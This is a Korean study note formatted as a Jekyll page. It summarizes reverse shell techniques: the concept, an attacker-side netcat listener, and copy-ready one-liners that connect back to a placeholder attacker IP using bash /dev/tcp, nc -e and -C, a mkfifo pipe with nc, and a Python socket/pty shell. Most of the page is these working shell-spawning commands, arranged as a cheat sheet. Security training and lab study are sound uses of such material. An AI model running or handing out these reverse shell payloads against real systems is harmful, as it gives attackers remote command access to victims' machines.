---
layout: default
title: "System 보안 1일차"
parent: System
nav_order: 1
---

# Reverse Shell 정리

## 1. 리버스 쉘 개요

### 리버스 쉘이란?

- 피해자 시스템이 공격자에게 접속하여 쉘을 제공하는 방식
- 방화벽/NAT 환경에서 **바인드 쉘보다 우회가 쉬움**

### 기본 구조

```
[공격자 PC]  ← 연결 ←  [피해자 시스템]
     nc                     bash / sh / python
```

------

## 2. 기본 동작 흐름

### 1) 공격자 PC (리스너 대기)

```
nc -lvp <PORT>
```

### 2) 피해자 시스템 (쉘 연결 시도)

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

------

## 3. Bash 기반 리버스 쉘

### /dev/tcp 사용

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

- Bash 내장 기능
- `/dev/tcp` 지원 환경에서만 동작

------

## 4. Netcat (nc) 기반 리버스 쉘

### -e 옵션 사용 (구버전 nc)

```
nc <ATTACKER_IP> <PORT> -e /bin/bash
```

### -C 옵션 사용 (환경에 따라)

```
nc <ATTACKER_IP> <PORT> -C /bin/bash
```

- 일부 최신 nc에서는 `-e` 옵션 제거됨
- 환경 의존성이 큼

------

## 5. FIFO(named pipe) 기반 리버스 쉘

### mkfifo 사용

```
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

### 특징

- `-e` 옵션이 없는 nc에서도 동작
- 비교적 범용적인 방식

------

## 6. Python 기반 리버스 쉘

### Python + socket + pty

```
python -c '
import socket, os, pty
s = socket.socket()
s.connect(("<ATTACKER_IP>", <PORT>))
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
'
```

### 장점

- TTY 지원 (`pty.spawn`)
- 안정적인 인터랙티브 쉘 제공
- Python이 설치된 대부분의 환경에서 사용 가능

------

## 7. 공격자 측 Netcat 리스너 예시

```
nc -lvp 8888
```

또는 특정 IP 바인딩

```
nc -lvp 8888 -s <ATTACKER_IP>
```

------

## 8. 방식별 요약 비교

| 방식            | 조건         | 특징        |
| --------------- | ------------ | ----------- |
| Bash `/dev/tcp` | Bash 지원    | 가장 간단   |
| nc `-e`         | 구버전 nc    | 직관적      |
| FIFO + nc       | nc 제한 환경 | 범용성 높음 |
| Python          | Python 설치  | 안정적 TTY  |

------

## 9. 실습 시 주의사항

- 방화벽 / 보안 솔루션에 의해 차단될 수 있음
- TTY 없는 쉘은 명령 실행이 불편함
- 권한은 **피해자 프로세스 권한 그대로** 획득됨

------

## 10. 한 줄 정리

> 리버스 쉘은 **피해자가 공격자에게 접속하는 구조**이며,
>  환경에 따라 Bash, nc, FIFO, Python 등 다양한 방식으로 구현할 수 있다.

